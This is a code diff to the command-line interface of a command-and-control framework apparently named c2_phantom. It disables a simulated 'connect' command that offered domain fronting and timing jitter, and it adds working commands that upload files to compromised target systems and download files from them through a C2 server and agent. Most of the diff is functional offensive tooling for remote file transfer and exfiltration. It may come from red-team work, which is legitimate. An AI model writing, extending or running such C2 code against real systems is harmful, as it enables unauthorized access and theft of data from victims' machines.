@@ -125,89 +125,30 @@ def init(config: Optional[str], force: bool) -> None:
         sys.exit(1)
 
 
-@main.command()
-@click.argument("target")
-@click.option("--protocol", type=click.Choice(["https", "dns", "websocket"]), default="https")
-@click.option("--encrypt", type=click.Choice(["aes256", "rsa", "ecc"]), default="aes256")
-@click.option("--proxy", help="Proxy chain (e.g., http://proxy:8080)")
-@click.option("--domain-front", help="Domain fronting target")
-@click.option("--jitter", type=int, default=1000, help="Timing jitter in ms")
-@click.option("--timeout", type=int, default=30, help="Connection timeout in seconds")
-def connect(
-    target: str,
-    protocol: str,
-    encrypt: str,
-    proxy: Optional[str],
-    domain_front: Optional[str],
-    jitter: int,
-    timeout: int,
-) -> None:
-    """Establish a connection to a target system."""
-    try:
-        print_info(f"Connecting to [cyan]{target}[/cyan] using [bold]{protocol.upper()}[/bold]...")
+# NOTE: The 'connect' command is disabled. 
+# Agents self-register when they start using: python -m c2_phantom.agent --server http://localhost:8443
+# Use 'phantom list' to see registered sessions after agents connect.
 
-        with Progress(
-            SpinnerColumn(),
-            TextColumn("[progress.description]{task.description}"),
-            BarColumn(),
-            console=console,
-        ) as progress:
-            task = progress.add_task("[cyan]Establishing connection...", total=100)
-
-            # Initialize session manager
-            session_manager = SessionManager()
-
-            # Update progress
-            progress.update(task, advance=30, description="[cyan]Initializing encryption...")
-
-            # Create session
-            metadata = {
-                "proxy": proxy,
-                "domain_front": domain_front,
-                "jitter": jitter,
-                "timeout": timeout,
-            }
-
-            progress.update(task, advance=30, description="[cyan]Creating session...")
-            session = session_manager.create_session(
-                target=target,
-                protocol=protocol,
-                encryption=encrypt,
-                metadata=metadata,
-            )
-
-            # Simulate connection establishment
-            progress.update(task, advance=20, description="[cyan]Performing handshake...")
-
-            # Update session status
-            session.status = SessionStatus.ACTIVE
-            session_manager.update_session(session.id, status=SessionStatus.ACTIVE)
-
-            progress.update(task, advance=20, description="[green]✓ Connected!")
-
-        # Success panel
-        table = Table(show_header=False, box=box.SIMPLE, padding=(0, 2))
-        table.add_row("[bold]Session ID:[/bold]", f"[cyan]{session.id}[/cyan]")
-        table.add_row("[bold]Target:[/bold]", f"[yellow]{target}[/yellow]")
-        table.add_row("[bold]Protocol:[/bold]", f"[green]{protocol.upper()}[/green]")
-        table.add_row("[bold]Encryption:[/bold]", f"[magenta]{encrypt.upper()}[/magenta]")
-
-        panel = Panel(
-            table,
-            title="🔗 Connection Established",
-            border_style="green",
-            box=box.ROUNDED,
-        )
-        console.print(panel)
-
-        print_success(f"\nSession created: [bold cyan]{session.id}[/bold cyan]")
-
-    except C2PhantomError as e:
-        print_error(f"Connection failed: {str(e)}")
-        sys.exit(1)
-    except Exception as e:
-        print_error(f"Unexpected error: {str(e)}")
-        sys.exit(1)
+# @main.command()
+# @click.argument("target")
+# @click.option("--protocol", type=click.Choice(["https", "dns", "websocket"]), default="https")
+# @click.option("--encrypt", type=click.Choice(["aes256", "rsa", "ecc"]), default="aes256")
+# @click.option("--proxy", help="Proxy chain (e.g., http://proxy:8080)")
+# @click.option("--domain-front", help="Domain fronting target")
+# @click.option("--jitter", type=int, default=1000, help="Timing jitter in ms")
+# @click.option("--timeout", type=int, default=30, help="Connection timeout in seconds")
+# def connect(
+#     target: str,
+#     protocol: str,
+#     encrypt: str,
+#     proxy: Optional[str],
+#     domain_front: Optional[str],
+#     jitter: int,
+#     timeout: int,
+# ) -> None:
+#     """Establish a connection to a target system."""
+#     # This command is disabled - agents self-register instead
+#     pass
 
 
 @main.command()
@@ -288,16 +229,14 @@ def list(status: str, output_format: str, verbose: bool) -> None:
 @click.argument("local_path", type=click.Path(exists=True))
 @click.argument("remote_path")
 @click.option("--session", required=True, help="Session ID")
-@click.option("--chunk-size", type=int, default=1024, help="Upload chunk size in KB")
-@click.option("--encrypt", is_flag=True, help="Encrypt file during transfer")
-@click.option("--progress", "show_progress", is_flag=True, help="Show progress bar")
+@click.option("--server", default="http://localhost:8443", help="C2 server URL")
+@click.option("--timeout", type=int, default=60, help="Upload timeout in seconds")
 def upload(
     local_path: str,
     remote_path: str,
     session: str,
-    chunk_size: int,
-    encrypt: bool,
-    show_progress: bool,
+    server: str,
+    timeout: int,
 ) -> None:
     """Upload files to target systems."""
     try:
@@ -306,36 +245,83 @@ def upload(
 
         print_info(f"Uploading [cyan]{file_path.name}[/cyan] ({file_size:,} bytes)...")
 
-        with Progress(
-            SpinnerColumn(),
-            TextColumn("[progress.description]{task.description}"),
-            BarColumn(),
-            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
-            console=console,
-        ) as progress:
-            task = progress.add_task(
-                f"[cyan]Uploading to {remote_path}...",
-                total=file_size,
-            )
-
-            # Simulate upload
-            uploaded = 0
-            chunk_bytes = chunk_size * 1024
-
-            with open(file_path, "rb") as f:
-                while uploaded < file_size:
-                    chunk = f.read(min(chunk_bytes, file_size - uploaded))
-                    if not chunk:
-                        break
-                    # Simulate network delay
-                    uploaded += len(chunk)
-                    progress.update(task, advance=len(chunk))
-
-        print_success(f"File uploaded successfully to [cyan]{remote_path}[/cyan]")
+        # Run async upload
+        result = asyncio.run(_upload_file_real(
+            local_path, remote_path, session, server, timeout
+        ))
+        
+        if result and result.get("status") == "success":
+            print_success(f"File uploaded successfully to [cyan]{remote_path}[/cyan]")
+        else:
+            error_msg = result.get("error", "Unknown error") if result else "Upload timed out"
+            print_error(f"Upload failed: {error_msg}")
+            sys.exit(1)
 
     except Exception as e:
         print_error(f"Upload failed: {str(e)}")
         sys.exit(1)
+
+
+async def _upload_file_real(
+    local_path: str,
+    remote_path: str,
+    session_id: str,
+    server_url: str,
+    timeout: int
+) -> Optional[dict]:
+    """Upload file via C2 server."""
+    from pathlib import Path
+    import base64
+    
+    client = C2Client(server_url=server_url)
+    
+    # Check server
+    if not await client.health_check():
+        print_error("C2 server is not running!")
+        sys.exit(1)
+    
+    # Read and encode file
+    file_path = Path(local_path)
+    file_size = file_path.stat().st_size
+    
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        console=console,
+    ) as progress:
+        task = progress.add_task("Reading file...", total=2)
+        
+        with open(file_path, "rb") as f:
+            file_data = f.read()
+        
+        progress.update(task, advance=1, description="Encoding...")
+        encoded_data = base64.b64encode(file_data).decode()
+        progress.update(task, advance=1, description="Uploading...")
+    
+    # Upload via client
+    try:
+        response = await client.upload_file(session_id, local_path, remote_path)
+        task_id = response.get("task_id")
+        
+        if not task_id:
+            return {"status": "error", "error": "No task ID returned"}
+        
+        # Wait for result
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            console=console,
+        ) as progress:
+            task = progress.add_task("Waiting for agent to write file...", total=None)
+            result = await client.get_result(session_id, task_id, timeout)
+            
+            if result:
+                progress.update(task, description="✓ Upload complete")
+            return result
+            
+    except Exception as e:
+        return {"status": "error", "error": str(e)}
 
 
 @main.command()
@@ -464,6 +450,109 @@ async def _execute_command_real(
 
 
 @main.command()
+@click.argument("remote_path")
+@click.argument("local_path", type=click.Path())
+@click.option("--session", required=True, help="Session ID")
+@click.option("--server", default="http://localhost:8443", help="C2 server URL")
+@click.option("--timeout", type=int, default=60, help="Download timeout in seconds")
+def download(
+    remote_path: str,
+    local_path: str,
+    session: str,
+    server: str,
+    timeout: int,
+) -> None:
+    """Download files from target systems."""
+    try:
+        print_info(f"Downloading [cyan]{remote_path}[/cyan]...")
+
+        # Run async download
+        result = asyncio.run(_download_file_real(
+            remote_path, local_path, session, server, timeout
+        ))
+        
+        if result and result.get("status") == "success":
+            file_size = result.get("size", 0)
+            print_success(f"File downloaded to [cyan]{local_path}[/cyan] ({file_size:,} bytes)")
+        else:
+            error_msg = result.get("error", "Unknown error") if result else "Download timed out"
+            print_error(f"Download failed: {error_msg}")
+            sys.exit(1)
+
+    except Exception as e:
+        print_error(f"Download failed: {str(e)}")
+        sys.exit(1)
+
+
+async def _download_file_real(
+    remote_path: str,
+    local_path: str,
+    session_id: str,
+    server_url: str,
+    timeout: int
+) -> Optional[dict]:
+    """Download file via C2 server."""
+    from pathlib import Path
+    import base64
+    
+    client = C2Client(server_url=server_url)
+    
+    # Check server
+    if not await client.health_check():
+        print_error("C2 server is not running!")
+        sys.exit(1)
+    
+    # Request file download
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        console=console,
+    ) as progress:
+        task = progress.add_task("Requesting file...", total=None)
+        
+        try:
+            # Queue download command
+            response = await client.download_file(session_id, remote_path)
+            task_id = response.get("task_id")
+            
+            if not task_id:
+                return {"status": "error", "error": "No task ID returned"}
+            
+            progress.update(task, description="Waiting for agent...")
+            
+            # Wait for result
+            result = await client.get_result(session_id, task_id, timeout)
+            
+            if not result or result.get("status") != "success":
+                return result or {"status": "error", "error": "Timeout"}
+            
+            progress.update(task, description="Decoding file...")
+            
+            # Decode and save file
+            encoded_data = result.get("data")
+            if not encoded_data:
+                return {"status": "error", "error": "No file data received"}
+            
+            file_data = base64.b64decode(encoded_data)
+            
+            # Write to disk
+            Path(local_path).parent.mkdir(parents=True, exist_ok=True)
+            with open(local_path, "wb") as f:
+                f.write(file_data)
+            
+            progress.update(task, description="✓ Download complete")
+            
+            return {
+                "status": "success",
+                "size": len(file_data),
+                "path": local_path
+            }
+            
+        except Exception as e:
+            return {"status": "error", "error": str(e)}
+
+
+@main.command()
 @click.argument("action", type=click.Choice(["list", "install", "remove", "info"]))
 @click.argument("plugin_name", required=False)
 def plugin(action: str, plugin_name: Optional[str]) -> None:
@@ -471,7 +560,7 @@ def plugin(action: str, plugin_name: Optional[str]) -> None:
     try:
         if action == "list":
             print_info("Available plugins:")
-            # Mock plugin list
+            # Plugin system not yet implemented
             table = Table(box=box.ROUNDED)
             table.add_column("Plugin", style="cyan")
             table.add_column("Version", style="green")
